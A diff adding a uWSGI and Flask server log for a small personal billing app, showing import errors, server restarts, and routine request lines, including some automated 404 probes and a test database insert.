@@ -1,0 +1,1695 @@
+ * Serving Flask app "app.py"
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+Usage: flask run [OPTIONS]
+
+Error: While importing "app", an ImportError was raised:
+
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/site-packages/flask/cli.py", line 240, in locate_app
+    __import__(module_name)
+  File "/home/python/flask/bill/app.py", line 2, in <module>
+    from operate_data import get_sum_all_data,insert_account_data,insert_bill
+  File "/home/python/flask/bill/operate_data.py", line 1, in <module>
+    import mysql.connector
+ImportError: No module named mysql.connector
+
+ * Serving Flask app "app.py"
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+Usage: flask run [OPTIONS]
+
+Error: While importing "app", an ImportError was raised:
+
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/site-packages/flask/cli.py", line 240, in locate_app
+    __import__(module_name)
+  File "/home/python/flask/bill/app.py", line 2, in <module>
+    from operate_data import get_sum_all_data,insert_account_data,insert_bill
+  File "/home/python/flask/bill/operate_data.py", line 1, in <module>
+    import mysql.connector
+ImportError: No module named mysql.connector
+
+ * Serving Flask app "app.py"
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+Usage: flask run [OPTIONS]
+
+Error: While importing "app", an ImportError was raised:
+
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/site-packages/flask/cli.py", line 240, in locate_app
+    __import__(module_name)
+  File "/home/python/flask/bill/app.py", line 2, in <module>
+    from operate_data import get_sum_all_data,insert_account_data,insert_bill
+  File "/home/python/flask/bill/operate_data.py", line 1, in <module>
+    import mysql.connector
+ImportError: No module named mysql.connector
+
+ * Serving Flask app "app.py"
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+Usage: flask run [OPTIONS]
+
+Error: While importing "app", an ImportError was raised:
+
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/site-packages/flask/cli.py", line 240, in locate_app
+    __import__(module_name)
+  File "/home/python/flask/bill/app.py", line 2, in <module>
+    from operate_data import get_sum_all_data,insert_account_data,insert_bill
+  File "/home/python/flask/bill/operate_data.py", line 1, in <module>
+    import mysql.connector
+ImportError: No module named mysql.connector
+
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Fri Dec 20 10:49:40 2019] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:43700 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x75f4b0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x75f4b0 pid: 24867 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 24867)
+spawned uWSGI worker 1 (pid: 24869, cores: 1)
+spawned uWSGI http 1 (pid: 24870)
+[pid: 24869|app: 0|req: 1/1] 127.0.0.1 () {44 vars in 784 bytes} [Fri Dec 20 10:49:56 2019] GET / => generated 3717 bytes in 11 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 2/2] 127.0.0.1 () {44 vars in 784 bytes} [Fri Dec 20 10:49:57 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 3/3] 127.0.0.1 () {44 vars in 784 bytes} [Fri Dec 20 10:49:57 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 4/4] 127.0.0.1 () {44 vars in 784 bytes} [Fri Dec 20 10:49:57 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 5/5] 127.0.0.1 () {44 vars in 784 bytes} [Fri Dec 20 10:49:57 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 6/6] 127.0.0.1 () {44 vars in 784 bytes} [Fri Dec 20 10:49:57 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 7/7] 127.0.0.1 () {44 vars in 784 bytes} [Fri Dec 20 10:49:57 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 8/8] 127.0.0.1 () {44 vars in 784 bytes} [Fri Dec 20 10:49:58 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 9/9] 127.0.0.1 () {28 vars in 418 bytes} [Sun Dec 22 22:37:22 2019] GET / => generated 3717 bytes in 26 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 10/10] 127.0.0.1 () {30 vars in 398 bytes} [Sun Dec 22 23:36:23 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 11/11] 127.0.0.1 () {30 vars in 398 bytes} [Mon Dec 23 00:07:20 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 12/12] 127.0.0.1 () {28 vars in 408 bytes} [Mon Dec 23 04:40:29 2019] HEAD / => generated 0 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (0 switches on core 0)
+[pid: 24869|app: 0|req: 13/13] 127.0.0.1 () {32 vars in 464 bytes} [Mon Dec 23 05:33:34 2019] GET /robots.txt => generated 232 bytes in 94 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 14/14] 127.0.0.1 () {36 vars in 724 bytes} [Mon Dec 23 05:33:38 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 15/15] 127.0.0.1 () {42 vars in 753 bytes} [Mon Dec 23 08:52:46 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 16/16] 127.0.0.1 () {40 vars in 681 bytes} [Mon Dec 23 08:52:46 2019] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 17/17] 127.0.0.1 () {36 vars in 724 bytes} [Mon Dec 23 15:16:06 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 18/18] 127.0.0.1 () {32 vars in 477 bytes} [Tue Dec 24 05:11:26 2019] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 19/19] 127.0.0.1 () {34 vars in 494 bytes} [Tue Dec 24 05:14:07 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 20/20] 127.0.0.1 () {34 vars in 495 bytes} [Tue Dec 24 08:14:07 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 21/21] 127.0.0.1 () {34 vars in 601 bytes} [Tue Dec 24 11:37:33 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 22/22] 127.0.0.1 () {34 vars in 618 bytes} [Tue Dec 24 13:14:39 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 23/23] 127.0.0.1 () {34 vars in 494 bytes} [Wed Dec 25 05:25:52 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 24/24] 127.0.0.1 () {32 vars in 464 bytes} [Wed Dec 25 11:02:27 2019] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 25/25] 127.0.0.1 () {36 vars in 722 bytes} [Wed Dec 25 11:02:30 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 26/26] 127.0.0.1 () {44 vars in 777 bytes} [Wed Dec 25 19:16:43 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 27/27] 127.0.0.1 () {36 vars in 724 bytes} [Wed Dec 25 21:15:16 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 28/28] 127.0.0.1 () {34 vars in 494 bytes} [Thu Dec 26 05:52:59 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 29/29] 127.0.0.1 () {34 vars in 494 bytes} [Fri Dec 27 05:57:27 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 30/30] 127.0.0.1 () {34 vars in 579 bytes} [Fri Dec 27 07:43:18 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 31/31] 127.0.0.1 () {34 vars in 513 bytes} [Fri Dec 27 07:43:18 2019] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 32/32] 127.0.0.1 () {34 vars in 489 bytes} [Fri Dec 27 07:43:18 2019] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 33/33] 127.0.0.1 () {34 vars in 473 bytes} [Fri Dec 27 07:43:18 2019] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 34/34] 127.0.0.1 () {34 vars in 473 bytes} [Fri Dec 27 07:43:18 2019] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 35/35] 127.0.0.1 () {36 vars in 586 bytes} [Fri Dec 27 07:43:18 2019] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 36/36] 127.0.0.1 () {36 vars in 628 bytes} [Fri Dec 27 07:43:20 2019] GET /bill.html => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 37/37] 127.0.0.1 () {36 vars in 595 bytes} [Fri Dec 27 07:43:20 2019] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 38/38] 127.0.0.1 () {32 vars in 478 bytes} [Sun Dec 29 00:34:22 2019] GET /wp-login.php => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 39/39] 127.0.0.1 () {34 vars in 632 bytes} [Sun Dec 29 06:52:30 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 40/40] 127.0.0.1 () {28 vars in 392 bytes} [Sun Dec 29 22:40:44 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 41/41] 127.0.0.1 () {30 vars in 398 bytes} [Tue Dec 31 02:42:18 2019] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 42/42] 127.0.0.1 () {32 vars in 463 bytes} [Wed Jan  1 02:02:13 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 43/43] 127.0.0.1 () {36 vars in 723 bytes} [Wed Jan  1 02:02:15 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 44/44] 127.0.0.1 () {32 vars in 535 bytes} [Wed Jan  1 18:16:03 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 45/45] 127.0.0.1 () {30 vars in 397 bytes} [Wed Jan  1 19:42:51 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 46/46] 127.0.0.1 () {36 vars in 600 bytes} [Wed Jan  1 21:10:15 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 47/47] 127.0.0.1 () {28 vars in 363 bytes} [Fri Jan  3 11:41:00 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 48/48] 127.0.0.1 () {32 vars in 464 bytes} [Fri Jan  3 21:38:56 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 49/49] 127.0.0.1 () {36 vars in 724 bytes} [Fri Jan  3 21:38:57 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 50/50] 127.0.0.1 () {28 vars in 408 bytes} [Sat Jan  4 20:10:30 2020] HEAD / => generated 0 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (0 switches on core 0)
+[pid: 24869|app: 0|req: 51/51] 127.0.0.1 () {30 vars in 398 bytes} [Sat Jan  4 21:45:26 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 52/52] 127.0.0.1 () {32 vars in 392 bytes} [Sun Jan  5 05:54:36 2020] GET /.git/config => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 53/53] 127.0.0.1 () {32 vars in 464 bytes} [Sun Jan  5 13:50:57 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 54/54] 127.0.0.1 () {36 vars in 724 bytes} [Sun Jan  5 13:50:58 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 55/55] 127.0.0.1 () {36 vars in 741 bytes} [Sun Jan  5 14:06:47 2020] GET /bill.html => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 56/56] 127.0.0.1 () {30 vars in 398 bytes} [Sun Jan  5 16:08:07 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 57/57] 127.0.0.1 () {32 vars in 464 bytes} [Mon Jan  6 02:13:09 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 58/58] 127.0.0.1 () {36 vars in 724 bytes} [Mon Jan  6 02:13:11 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 59/59] 127.0.0.1 () {36 vars in 723 bytes} [Mon Jan  6 11:56:56 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 60/60] 127.0.0.1 () {32 vars in 442 bytes} [Tue Jan  7 01:35:45 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 61/61] 127.0.0.1 () {32 vars in 443 bytes} [Tue Jan  7 03:56:41 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 62/62] 127.0.0.1 () {42 vars in 752 bytes} [Tue Jan  7 13:29:07 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 63/63] 127.0.0.1 () {40 vars in 680 bytes} [Tue Jan  7 13:29:07 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 64/64] 127.0.0.1 () {40 vars in 741 bytes} [Tue Jan  7 13:29:30 2020] GET /account => generated 4303 bytes in 23 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 24869|app: 0|req: 65/65] 127.0.0.1 () {52 vars in 983 bytes} [Tue Jan  7 13:37:03 2020] POST /accountstatus => generated 10 bytes in 304 msecs (HTTP/1.0 200) 2 headers in 79 bytes (1 switches on core 0)
+Tue Jan  7 13:52:43 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 24870)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 24869)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:43700)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 13:52:44 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:40971 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x8a9430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x8a9430 pid: 24867 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 24867)
+spawned uWSGI worker 1 (pid: 12370, cores: 1)
+spawned uWSGI http 1 (pid: 12371)
+Tue Jan  7 13:52:56 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 12371)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 12370)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 4 mapped to socket 0 (127.0.0.1:40971)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 13:52:57 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:37374 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x87f430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x87f430 pid: 24867 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 24867)
+spawned uWSGI worker 1 (pid: 12383, cores: 1)
+spawned uWSGI http 1 (pid: 12384)
+gateway "uWSGI http 1" has been buried (pid: 12384)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:37374)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 13:53:19 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:39512 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xdbf430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0xdbf430 pid: 24867 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 24867)
+spawned uWSGI worker 1 (pid: 12406, cores: 1)
+spawned uWSGI http 1 (pid: 12407)
+Tue Jan  7 13:53:29 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 13:53:30 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:33146 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x16a34b0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x16a34b0 pid: 12422 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 12422)
+spawned uWSGI worker 1 (pid: 12425, cores: 1)
+spawned uWSGI http 1 (pid: 12426)
+[pid: 12425|app: 0|req: 1/1] 127.0.0.1 () {42 vars in 753 bytes} [Tue Jan  7 13:57:34 2020] GET / => generated 3717 bytes in 16 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 12425|app: 0|req: 2/2] 127.0.0.1 () {40 vars in 681 bytes} [Tue Jan  7 13:57:34 2020] GET /favicon.ico => generated 232 bytes in 12 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, bankcard) VALUES ( 2020-01-07,'测试',0.01) ;
+[pid: 12425|app: 0|req: 3/3] 127.0.0.1 () {52 vars in 973 bytes} [Tue Jan  7 13:57:42 2020] POST /insertresult => generated 304 bytes in 27 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+Tue Jan  7 13:58:19 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 12426)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 12425)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:33146)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Tue Jan  7 13:58:20 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:46597 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1eaa430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
